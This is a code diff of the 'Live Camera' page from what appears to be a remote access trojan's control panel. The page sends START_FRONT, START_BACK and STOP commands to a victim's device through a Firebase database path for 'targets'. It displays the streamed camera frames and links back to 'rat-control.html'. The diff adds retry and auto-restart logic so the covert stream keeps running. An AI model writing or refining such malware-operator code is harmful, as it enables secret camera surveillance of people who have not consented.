@@ -17,7 +17,6 @@
             -webkit-user-select: none;
         }
 
-        /* ===== TOP BAR ===== */
         .top-bar {
             position: fixed;
             top: 0;
@@ -72,7 +71,6 @@
             background: rgba(255,255,255,0.3);
         }
 
-        /* ===== LIVE BADGE ===== */
         .live-badge {
             position: fixed;
             top: 68px;
@@ -83,11 +81,14 @@
             font-weight: bold;
             padding: 4px 12px;
             border-radius: 50px;
-            display: flex;
+            display: none;
             align-items: center;
             gap: 6px;
             z-index: 100;
             letter-spacing: 1px;
+        }
+        .live-badge.show {
+            display: flex;
         }
         .live-badge .dot {
             width: 8px;
@@ -102,7 +103,6 @@
             100% { opacity: 1; transform: scale(1); }
         }
 
-        /* ===== CAMERA VIEW ===== */
         .camera-view {
             position: fixed;
             top: 0;
@@ -134,7 +134,6 @@
             opacity: 0.5;
         }
 
-        /* ===== SWITCH CAMERA BUTTON ===== */
         .switch-camera-btn {
             position: fixed;
             top: 68px;
@@ -165,7 +164,6 @@
             cursor: not-allowed;
         }
 
-        /* ===== LOADING OVERLAY ===== */
         .loading-overlay {
             position: fixed;
             top: 0;
@@ -173,14 +171,14 @@
             width: 100%;
             height: 100%;
             background: rgba(0,0,0,0.9);
-            display: none;
+            display: flex;
             align-items: center;
             justify-content: center;
             flex-direction: column;
             z-index: 200;
         }
-        .loading-overlay.active {
-            display: flex;
+        .loading-overlay.hide {
+            display: none;
         }
         .loading-overlay .spinner {
             width: 50px;
@@ -200,7 +198,6 @@
             font-size: 14px;
         }
 
-        /* ===== STATUS OVERLAY ===== */
         .status-overlay {
             position: fixed;
             bottom: 24px;
@@ -230,7 +227,6 @@
             font-weight: bold;
         }
 
-        /* ===== FPS ===== */
         .fps-box {
             position: fixed;
             bottom: 24px;
@@ -248,7 +244,6 @@
 </head>
 <body>
 
-    <!-- CAMERA VIEW (fullscreen) -->
     <div class="camera-view" id="cameraView">
         <div class="placeholder">
             <span class="icon">📷</span>
@@ -256,31 +251,26 @@
         </div>
     </div>
 
-    <!-- TOP BAR -->
     <div class="top-bar">
         <button class="back-btn" onclick="history.back()">←</button>
         <div class="title">Live Camera</div>
         <button class="close-btn" onclick="closeLiveCamera()">✕</button>
     </div>
 
-    <!-- LIVE BADGE -->
-    <div class="live-badge" id="liveBadge" style="display:none;">
+    <div class="live-badge" id="liveBadge">
         <span class="dot"></span>
         <span>LIVE</span>
     </div>
 
-    <!-- SWITCH CAMERA BUTTON -->
     <button class="switch-camera-btn" id="btnSwitch" onclick="switchCamera()" disabled>
         🔄
     </button>
 
-    <!-- LOADING OVERLAY -->
     <div class="loading-overlay" id="loadingOverlay">
         <div class="spinner"></div>
         <div class="text">Menghubungkan ke kamera...</div>
     </div>
 
-    <!-- STATUS OVERLAY -->
     <div class="status-overlay">
         <div class="item">
             <span class="label">Camera:</span>
@@ -292,7 +282,6 @@
         </div>
     </div>
 
-    <!-- FPS COUNTER -->
     <div class="fps-box" id="fpsBox">FPS: 0</div>
 
     <script type="module">
@@ -319,23 +308,24 @@
         let lastFpsTime = Date.now();
         let lastFrameTime = 0;
         let isStreaming = false;
+        let retryCount = 0;
 
-        // ===== AUTO START STREAMING =====
-        function startStreaming() {
-            const camera = currentCamera === 'front' ? 'front' : 'back';
+        function startStreaming(facing) {
+            const camera = facing || currentCamera;
             const cmd = camera === 'front' ? 'START_FRONT' : 'START_BACK';
+            console.log('[LiveCamera] Sending:', cmd);
             set(ref(db, 'targets/' + targetId + '/live_camera/command'), cmd);
-            console.log('[LiveCamera] Start streaming:', camera);
         }
 
         function stopStreaming() {
+            console.log('[LiveCamera] STOP');
             set(ref(db, 'targets/' + targetId + '/live_camera/command'), 'STOP');
-            console.log('[LiveCamera] Stop streaming');
         }
 
-        // ===== AUTO START saat halaman dibuka =====
-        loadingOverlay.classList.add('active');
-        startStreaming();
+        // ===== START saat halaman dibuka =====
+        console.log('[LiveCamera] Page loaded, target:', targetId);
+        loadingOverlay.classList.remove('hide');
+        startStreaming('back');
 
         // ===== LISTEN STATUS =====
         onValue(ref(db, 'targets/' + targetId + '/live_camera/status'), (snap) => {
@@ -343,24 +333,33 @@
             statusState.textContent = status;
 
             if (status === 'streaming') {
-                liveBadge.style.display = 'flex';
-                loadingOverlay.classList.remove('active');
+                liveBadge.classList.add('show');
+                loadingOverlay.classList.add('hide');
                 btnSwitch.disabled = false;
                 isStreaming = true;
+                retryCount = 0;
             } else if (status === 'idle') {
-                liveBadge.style.display = 'none';
-                loadingOverlay.classList.add('active');
+                liveBadge.classList.remove('show');
+                loadingOverlay.classList.remove('hide');
                 btnSwitch.disabled = true;
                 isStreaming = false;
+
+                // Retry kalau masih idle
+                if (retryCount < 3) {
+                    retryCount++;
+                    setTimeout(() => {
+                        if (!isStreaming) startStreaming(currentCamera);
+                    }, 2000);
+                }
             } else {
-                liveBadge.style.display = 'none';
-                loadingOverlay.classList.add('active');
+                liveBadge.classList.remove('show');
+                loadingOverlay.classList.remove('hide');
                 btnSwitch.disabled = true;
                 isStreaming = false;
             }
         });
 
-        // ===== LISTEN CAMERA FACING =====
+        // ===== LISTEN CAMERA =====
         onValue(ref(db, 'targets/' + targetId + '/live_camera/camera'), (snap) => {
             const cam = snap.val() || 'back';
             currentCamera = cam;
@@ -372,12 +371,10 @@
             const base64 = snap.val();
             if (!base64 || base64.length < 100) return;
 
-            // Update gambar
-            cameraView.innerHTML = '<img src="data:image/jpeg;base64,' + base64 + '" alt="Live Camera">';
+            cameraView.innerHTML = '<img src="data:image/jpeg;base64,' + base64 + '" alt="Live">';
 
             lastFrameTime = Date.now();
 
-            // Update FPS
             frameCount++;
             const now = Date.now();
             if (now - lastFpsTime >= 1000) {
@@ -388,49 +385,40 @@
             }
         });
 
-        // ===== AUTO-STOP kalau frame tidak update =====
+        // ===== AUTO-RESTART kalau frame timeout =====
         setInterval(() => {
             if (!isStreaming) return;
 
             const now = Date.now();
             if (lastFrameTime > 0 && (now - lastFrameTime) > 8000) {
-                // 8 detik tidak ada frame — stream mungkin mati
-                liveBadge.style.display = 'none';
-                loadingOverlay.classList.add('active');
-                console.log('[LiveCamera] Frame timeout, restart stream...');
-                startStreaming();
+                console.log('[LiveCamera] Frame timeout, restart...');
+                liveBadge.classList.remove('show');
+                loadingOverlay.classList.remove('hide');
+                isStreaming = false;
+                startStreaming(currentCamera);
             }
         }, 5000);
 
         // ===== SWITCH CAMERA =====
         window.switchCamera = function() {
             const newCam = currentCamera === 'back' ? 'front' : 'back';
-            currentCamera = newCam;
-
             console.log('[LiveCamera] Switch to:', newCam);
 
-            // Update UI langsung
             statusCamera.textContent = newCam === 'front' ? 'Depan' : 'Belakang';
-            liveBadge.style.display = 'none';
-            loadingOverlay.classList.add('active');
+            liveBadge.classList.remove('show');
+            loadingOverlay.classList.remove('hide');
 
-            // Kirim command switch
-            const cmd = newCam === 'front' ? 'START_FRONT' : 'START_BACK';
-            set(ref(db, 'targets/' + targetId + '/live_camera/command'), cmd);
+            startStreaming(newCam);
         };
 
-        // ===== CLOSE LIVE CAMERA =====
+        // ===== CLOSE =====
         window.closeLiveCamera = function() {
-            // Stop stream
             stopStreaming();
-
-            // Kembali ke rat-control
             setTimeout(() => {
                 window.location.href = 'rat-control.html?target=' + targetId;
             }, 300);
         };
 
-        // ===== CLEANUP saat keluar =====
         window.addEventListener('beforeunload', () => {
             stopStreaming();
         });
